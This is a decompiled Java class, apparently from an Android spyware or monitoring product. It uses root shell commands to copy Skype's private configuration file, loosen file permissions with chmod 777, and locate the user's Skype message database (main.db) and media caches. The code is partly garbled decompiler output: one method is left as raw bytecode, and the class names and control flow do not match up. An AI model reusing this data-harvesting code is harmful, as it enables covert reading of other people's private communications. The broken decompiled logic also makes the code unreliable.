package com.vvt.n.a.e;

import android.os.SystemClock;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import javax.xml.parsers.DocumentBuilderFactory;

public class b
{
  public static final String a;
  public static final String b;
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  static
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder = localStringBuilder.append("/data/data/com.skype.raider/files");
    String str = File.separator;
    a = str + "shared.xml";
    localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder = localStringBuilder.append("/dbdata/files/com.skype.raider/files");
    str = File.separator;
    b = str + "shared.xml";
  }
  
  public static String a(String paramString)
  {
    Class localClass = b.class;
    boolean bool = false;
    String str = null;
    try
    {
      DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
      File localFile = new java/io/File;
      localFile.<init>(paramString);
      int i = localFile.exists();
      if (i != 0)
      {
        i = 0;
        for (;;)
        {
          int k = 10;
          if (i >= k) {
            break;
          }
          bool = c;
          if (bool) {}
          str = a(localDocumentBuilderFactory, localFile);
          if (str != null) {
            break;
          }
          long l = 1000L;
          SystemClock.sleep(l);
          int j;
          i += 1;
        }
      }
      return str;
    }
    finally {}
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    Object localObject1 = null;
    int i = 2;
    int j = 1;
    boolean bool1 = false;
    Object localObject2 = null;
    Object localObject3 = new Object[i];
    localObject3[0] = "/data/data/com.skype.raider/files";
    String str1 = "shared.xml";
    localObject3[j] = str1;
    String str2 = String.format("%s/%s", (Object[])localObject3);
    boolean bool2 = ShellUtil.b(str2);
    if (bool2) {}
    for (;;)
    {
      bool2 = com.vvt.ag.b.a(str2);
      if (!bool2)
      {
        str1 = b(paramString1);
        localObject3 = p.a(str1, "shared.xml");
        localObject2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        j = 5;
      }
      try
      {
        Object[] arrayOfObject = new Object[j];
        i = 0;
        arrayOfObject[0] = str1;
        i = 1;
        arrayOfObject[i] = str1;
        i = 2;
        arrayOfObject[i] = paramString3;
        i = 3;
        arrayOfObject[i] = paramString3;
        i = 4;
        arrayOfObject[i] = str1;
        localObject2 = String.format((String)localObject2, arrayOfObject);
        KMShell.a((String)localObject2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(str1);
        }
        str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject2 = new Object[k];
        j = 0;
        arrayOfObject = null;
        localObject2[0] = paramString2;
        j = 1;
        localObject2[j] = str2;
        int m = 2;
        localObject2[m] = localObject3;
        m = 3;
        localObject2[m] = localObject3;
        m = 4;
        localObject2[m] = paramString3;
        m = 5;
        localObject2[m] = paramString3;
        m = 6;
        localObject2[m] = localObject3;
        str2 = String.format(str1, (Object[])localObject2);
        KMShell.a(str2);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject3);
        }
        localObject1 = localObject3;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          boolean bool3 = d;
          if (!bool3) {}
        }
      }
      return (String)localObject1;
      localObject3 = new Object[i];
      localObject3[0] = "/dbdata/files/com.skype.raider/files";
      str1 = "shared.xml";
      localObject3[j] = str1;
      str2 = String.format("%s/%s", (Object[])localObject3);
      bool2 = ShellUtil.b(str2);
      if (!bool2)
      {
        bool3 = false;
        str2 = null;
      }
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    boolean bool = ShellUtil.b(paramString1);
    String str1 = null;
    if (bool)
    {
      String str2 = b(paramString1, paramString2, paramString3, paramString4);
      if (str2 != null)
      {
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str2;
        bool = true;
        String str3 = "main.db";
        arrayOfObject[bool] = str3;
        str1 = String.format("%s/%s", arrayOfObject);
      }
      bool = c;
      if (!bool) {}
    }
    for (;;)
    {
      return str1;
      bool = c;
      if (!bool) {}
    }
  }
  
  /* Error */
  private static String a(DocumentBuilderFactory paramDocumentBuilderFactory, File paramFile)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: aload_1
    //   5: invokevirtual 63	java/io/File:exists	()Z
    //   8: istore 4
    //   10: iload 4
    //   12: ifeq +391 -> 403
    //   15: new 133	java/io/FileInputStream
    //   18: astore 5
    //   20: aload 5
    //   22: aload_1
    //   23: invokespecial 136	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   26: aload_0
    //   27: invokevirtual 140	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   30: astore 6
    //   32: new 142	org/xml/sax/InputSource
    //   35: astore 7
    //   37: aload 7
    //   39: aload 5
    //   41: invokespecial 145	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   44: aload 6
    //   46: aload 7
    //   48: invokevirtual 151	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   51: astore 6
    //   53: aload 6
    //   55: invokeinterface 157 1 0
    //   60: astore 7
    //   62: aload 7
    //   64: invokeinterface 162 1 0
    //   69: ldc -92
    //   71: astore 7
    //   73: aload 6
    //   75: aload 7
    //   77: invokeinterface 168 2 0
    //   82: astore 6
    //   84: aload 6
    //   86: ifnull +308 -> 394
    //   89: iconst_0
    //   90: istore 8
    //   92: aconst_null
    //   93: astore 7
    //   95: aload 6
    //   97: iconst_0
    //   98: invokeinterface 174 2 0
    //   103: astore 7
    //   105: aload 7
    //   107: ifnull +287 -> 394
    //   110: iconst_0
    //   111: istore 8
    //   113: aconst_null
    //   114: astore 7
    //   116: aload 6
    //   118: iconst_0
    //   119: invokeinterface 174 2 0
    //   124: astore 6
    //   126: aload 6
    //   128: invokeinterface 180 1 0
    //   133: istore 8
    //   135: iconst_1
    //   136: istore 9
    //   138: iload 8
    //   140: iload 9
    //   142: if_icmpne +252 -> 394
    //   145: aload 6
    //   147: checkcast 159	org/w3c/dom/Element
    //   150: astore 6
    //   152: ldc -74
    //   154: astore 7
    //   156: aload 6
    //   158: aload 7
    //   160: invokeinterface 183 2 0
    //   165: astore 6
    //   167: iconst_0
    //   168: istore 8
    //   170: aconst_null
    //   171: astore 7
    //   173: aload 6
    //   175: iconst_0
    //   176: invokeinterface 174 2 0
    //   181: astore 6
    //   183: aload 6
    //   185: invokeinterface 186 1 0
    //   190: astore_3
    //   191: aload_3
    //   192: astore 6
    //   194: aload 5
    //   196: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   199: getstatic 16	com/vvt/n/a/e/removeFromPath:MyUncaughtExceptionHandler	Z
    //   202: istore_2
    //   203: iload_2
    //   204: ifeq +3 -> 207
    //   207: aload 6
    //   209: areturn
    //   210: astore 6
    //   212: iconst_0
    //   213: istore 4
    //   215: aconst_null
    //   216: astore 6
    //   218: getstatic 21	com/vvt/n/a/e/removeFromPath:d	Z
    //   221: istore 10
    //   223: iload 10
    //   225: ifeq +3 -> 228
    //   228: aload 6
    //   230: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   233: iconst_0
    //   234: istore 4
    //   236: aconst_null
    //   237: astore 6
    //   239: goto -40 -> 199
    //   242: astore 6
    //   244: iconst_0
    //   245: istore 10
    //   247: aconst_null
    //   248: astore 5
    //   250: getstatic 21	com/vvt/n/a/e/removeFromPath:d	Z
    //   253: istore 4
    //   255: iload 4
    //   257: ifeq +3 -> 260
    //   260: aload 5
    //   262: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   265: iconst_0
    //   266: istore 4
    //   268: aconst_null
    //   269: astore 6
    //   271: goto -72 -> 199
    //   274: astore 6
    //   276: iconst_0
    //   277: istore 10
    //   279: aconst_null
    //   280: astore 5
    //   282: getstatic 21	com/vvt/n/a/e/removeFromPath:d	Z
    //   285: istore 4
    //   287: iload 4
    //   289: ifeq +3 -> 292
    //   292: aload 5
    //   294: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   297: iconst_0
    //   298: istore 4
    //   300: aconst_null
    //   301: astore 6
    //   303: goto -104 -> 199
    //   306: astore 6
    //   308: iconst_0
    //   309: istore 10
    //   311: aconst_null
    //   312: astore 5
    //   314: getstatic 21	com/vvt/n/a/e/removeFromPath:d	Z
    //   317: istore 4
    //   319: iload 4
    //   321: ifeq +3 -> 324
    //   324: aload 5
    //   326: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   329: iconst_0
    //   330: istore 4
    //   332: aconst_null
    //   333: astore 6
    //   335: goto -136 -> 199
    //   338: astore 6
    //   340: iconst_0
    //   341: istore 10
    //   343: aconst_null
    //   344: astore 5
    //   346: aload 5
    //   348: invokestatic 190	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   351: aload 6
    //   353: athrow
    //   354: astore 6
    //   356: goto -10 -> 346
    //   359: astore_3
    //   360: aload 6
    //   362: astore 5
    //   364: aload_3
    //   365: astore 6
    //   367: goto -21 -> 346
    //   370: astore 6
    //   372: goto -58 -> 314
    //   375: astore 6
    //   377: goto -95 -> 282
    //   380: astore 6
    //   382: goto -132 -> 250
    //   385: astore 6
    //   387: aload 5
    //   389: astore 6
    //   391: goto -173 -> 218
    //   394: iconst_0
    //   395: istore 4
    //   397: aconst_null
    //   398: astore 6
    //   400: goto -206 -> 194
    //   403: iconst_0
    //   404: istore 4
    //   406: aconst_null
    //   407: astore 6
    //   409: goto -210 -> 199
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	412	0	paramDocumentBuilderFactory	DocumentBuilderFactory
    //   0	412	1	paramFile	File
    //   1	203	2	bool1	boolean
    //   3	189	3	str	String
    //   359	6	3	localObject1	Object
    //   8	397	4	bool2	boolean
    //   18	370	5	localObject2	Object
    //   30	178	6	localObject3	Object
    //   210	1	6	localParserConfigurationException1	javax.xml.parsers.ParserConfigurationException
    //   216	22	6	localInputStream	java.io.InputStream
    //   242	1	6	localSAXException1	org.xml.sax.SAXException
    //   269	1	6	localObject4	Object
    //   274	1	6	localIOException1	java.io.IOException
    //   301	1	6	localObject5	Object
    //   306	1	6	localException1	Exception
    //   333	1	6	localObject6	Object
    //   338	14	6	localObject7	Object
    //   354	7	6	localObject8	Object
    //   365	1	6	localObject9	Object
    //   370	1	6	localException2	Exception
    //   375	1	6	localIOException2	java.io.IOException
    //   380	1	6	localSAXException2	org.xml.sax.SAXException
    //   385	1	6	localParserConfigurationException2	javax.xml.parsers.ParserConfigurationException
    //   389	19	6	localObject10	Object
    //   35	137	7	localObject11	Object
    //   90	79	8	i	int
    //   136	7	9	j	int
    //   221	121	10	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   15	18	210	javax/xml/parsers/ParserConfigurationException
    //   22	26	210	javax/xml/parsers/ParserConfigurationException
    //   15	18	242	org/xml/sax/SAXException
    //   22	26	242	org/xml/sax/SAXException
    //   15	18	274	java/io/IOException
    //   22	26	274	java/io/IOException
    //   15	18	306	java/lang/Exception
    //   22	26	306	java/lang/Exception
    //   15	18	338	finally
    //   22	26	338	finally
    //   26	30	354	finally
    //   32	35	354	finally
    //   39	44	354	finally
    //   46	51	354	finally
    //   53	60	354	finally
    //   62	69	354	finally
    //   75	82	354	finally
    //   97	103	354	finally
    //   118	124	354	finally
    //   126	133	354	finally
    //   145	150	354	finally
    //   158	165	354	finally
    //   175	181	354	finally
    //   183	190	354	finally
    //   250	253	354	finally
    //   282	285	354	finally
    //   314	317	354	finally
    //   218	221	359	finally
    //   26	30	370	java/lang/Exception
    //   32	35	370	java/lang/Exception
    //   39	44	370	java/lang/Exception
    //   46	51	370	java/lang/Exception
    //   53	60	370	java/lang/Exception
    //   62	69	370	java/lang/Exception
    //   75	82	370	java/lang/Exception
    //   97	103	370	java/lang/Exception
    //   118	124	370	java/lang/Exception
    //   126	133	370	java/lang/Exception
    //   145	150	370	java/lang/Exception
    //   158	165	370	java/lang/Exception
    //   175	181	370	java/lang/Exception
    //   183	190	370	java/lang/Exception
    //   26	30	375	java/io/IOException
    //   32	35	375	java/io/IOException
    //   39	44	375	java/io/IOException
    //   46	51	375	java/io/IOException
    //   53	60	375	java/io/IOException
    //   62	69	375	java/io/IOException
    //   75	82	375	java/io/IOException
    //   97	103	375	java/io/IOException
    //   118	124	375	java/io/IOException
    //   126	133	375	java/io/IOException
    //   145	150	375	java/io/IOException
    //   158	165	375	java/io/IOException
    //   175	181	375	java/io/IOException
    //   183	190	375	java/io/IOException
    //   26	30	380	org/xml/sax/SAXException
    //   32	35	380	org/xml/sax/SAXException
    //   39	44	380	org/xml/sax/SAXException
    //   46	51	380	org/xml/sax/SAXException
    //   53	60	380	org/xml/sax/SAXException
    //   62	69	380	org/xml/sax/SAXException
    //   75	82	380	org/xml/sax/SAXException
    //   97	103	380	org/xml/sax/SAXException
    //   118	124	380	org/xml/sax/SAXException
    //   126	133	380	org/xml/sax/SAXException
    //   145	150	380	org/xml/sax/SAXException
    //   158	165	380	org/xml/sax/SAXException
    //   175	181	380	org/xml/sax/SAXException
    //   183	190	380	org/xml/sax/SAXException
    //   26	30	385	javax/xml/parsers/ParserConfigurationException
    //   32	35	385	javax/xml/parsers/ParserConfigurationException
    //   39	44	385	javax/xml/parsers/ParserConfigurationException
    //   46	51	385	javax/xml/parsers/ParserConfigurationException
    //   53	60	385	javax/xml/parsers/ParserConfigurationException
    //   62	69	385	javax/xml/parsers/ParserConfigurationException
    //   75	82	385	javax/xml/parsers/ParserConfigurationException
    //   97	103	385	javax/xml/parsers/ParserConfigurationException
    //   118	124	385	javax/xml/parsers/ParserConfigurationException
    //   126	133	385	javax/xml/parsers/ParserConfigurationException
    //   145	150	385	javax/xml/parsers/ParserConfigurationException
    //   158	165	385	javax/xml/parsers/ParserConfigurationException
    //   175	181	385	javax/xml/parsers/ParserConfigurationException
    //   183	190	385	javax/xml/parsers/ParserConfigurationException
  }
  
  public static List a()
  {
    int i = 2;
    int j = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.skype.raider";
    String str = String.format("%s/%s", arrayOfObject);
    localArrayList.add(str);
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[j] = "com.skype.raider";
    str = String.format("%s/%s", arrayOfObject);
    localArrayList.add(str);
    return localArrayList;
  }
  
  public static String b(String paramString)
  {
    return p.a(paramString, "skype");
  }
  
  public static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    int i = 2;
    int j = 1;
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = a(paramString2, paramString3, paramString4);
    boolean bool2;
    Object localObject2;
    String str;
    if (localObject1 != null)
    {
      localObject1 = a((String)localObject1);
      bool2 = c;
      if ((!bool2) || (localObject1 != null))
      {
        localObject2 = new Object[i];
        localObject2[0] = paramString1;
        localObject2[j] = localObject1;
        str = String.format("%s/files/%s", (Object[])localObject2);
        boolean bool3 = ShellUtil.b(str);
        if (bool3) {
          localObject1 = str;
        }
      }
    }
    for (;;)
    {
      bool2 = c;
      if (bool2) {}
      bool2 = c;
      if (bool2) {}
      return (String)localObject1;
      str = "live:";
      bool2 = ((String)localObject1).startsWith(str);
      if (bool2)
      {
        str = "live:";
        localObject2 = "";
        localObject1 = ((String)localObject1).replace(str, (CharSequence)localObject2);
      }
      str = "%s/files/live#3a%s";
      localObject2 = new Object[i];
      localObject2[0] = paramString1;
      localObject2[j] = localObject1;
      localObject1 = String.format(str, (Object[])localObject2);
      bool2 = ShellUtil.b((String)localObject1);
      if (!bool2)
      {
        bool1 = false;
        localObject1 = null;
      }
    }
  }
  
  public static String c(String paramString)
  {
    int i = 2;
    int j = 1;
    String str1 = "";
    Object localObject1 = "live:";
    boolean bool1 = paramString.startsWith((String)localObject1);
    if (bool1)
    {
      localObject1 = paramString.replace("live:", "");
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str2 = "live#3a";
      localObject2 = ((StringBuilder)localObject2).append(str2);
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      paramString = ((StringBuilder)localObject1).toString();
    }
    Object localObject2 = new Object[i];
    localObject2[0] = paramString;
    String str2 = "media_cache_v3";
    localObject2[j] = str2;
    localObject1 = String.format("/data/data/com.skype.raider/files/%s/media_messaging/%s", (Object[])localObject2);
    boolean bool2 = ShellUtil.b((String)localObject1);
    if (bool2) {}
    for (;;)
    {
      return (String)localObject1;
      localObject2 = new Object[i];
      localObject2[0] = paramString;
      str2 = "media_cache_v2";
      localObject2[j] = str2;
      localObject1 = String.format("/data/data/com.skype.raider/files/%s/media_messaging/%s", (Object[])localObject2);
      bool2 = ShellUtil.b((String)localObject1);
      if (!bool2)
      {
        localObject2 = new Object[i];
        localObject2[0] = paramString;
        str2 = "media_cache";
        localObject2[j] = str2;
        localObject1 = String.format("/data/data/com.skype.raider/files/%s/media_messaging/%s", (Object[])localObject2);
        bool2 = ShellUtil.b((String)localObject1);
        if (!bool2) {
          localObject1 = str1;
        }
      }
    }
  }
  
  public static String d(String paramString)
  {
    int i = 2;
    int j = 1;
    String str1 = "";
    Object localObject1 = "live:";
    boolean bool1 = paramString.startsWith((String)localObject1);
    if (bool1)
    {
      localObject1 = paramString.replace("live:", "");
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str2 = "live#3a";
      localObject2 = ((StringBuilder)localObject2).append(str2);
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      paramString = ((StringBuilder)localObject1).toString();
    }
    Object localObject2 = new Object[i];
    localObject2[0] = paramString;
    String str2 = "emo_cache_v2";
    localObject2[j] = str2;
    localObject1 = String.format("/data/data/com.skype.raider/files/%s/media_messaging/%s", (Object[])localObject2);
    boolean bool2 = ShellUtil.b((String)localObject1);
    if (bool2) {}
    for (;;)
    {
      boolean bool3 = c;
      if (bool3) {}
      return (String)localObject1;
      localObject2 = new Object[i];
      localObject2[0] = paramString;
      str2 = "emo_cache";
      localObject2[j] = str2;
      localObject1 = String.format("/data/data/com.skype.raider/files/%s/media_messaging/%s", (Object[])localObject2);
      bool2 = ShellUtil.b((String)localObject1);
      if (!bool2) {
        localObject1 = str1;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/e/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */